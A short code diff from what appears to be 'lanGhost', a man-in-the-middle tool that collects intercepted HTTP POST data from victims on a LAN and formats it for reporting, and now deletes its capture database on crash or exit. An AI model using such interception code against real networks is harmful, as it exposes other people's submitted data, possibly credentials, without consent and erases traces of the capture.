@@ -209,7 +209,7 @@ def mitmHandler(target, ID, bot):
                         break
                     else:
                         if item[4] == "POST":
-                            textline += str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + str(item[5]) + "\n\n"
+                            textline += str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + item[5].encode('ascii', 'xmlcharrefreplace') + "\n\n"
                         else:
                             textline += str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
                     DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=" + str(item[0]))
@@ -219,10 +219,12 @@ def mitmHandler(target, ID, bot):
                 DBconn.close()
                 time.sleep(1)
             except:
+                os.system("rm " + script_path + "lanGhost.db")
                 print("[!!!] mitmHandler crashed...")
         else:
             print("[+][mitmHandler][ID:" + str(ID) + "] Stopping mitmdump...")
             os.system("sudo screen -S lanGhost-mitm-" + str(ID) + " -X stuff '^C\n'")
+            os.system("rm " + script_path + "lanGhost.db")
             break
 
 
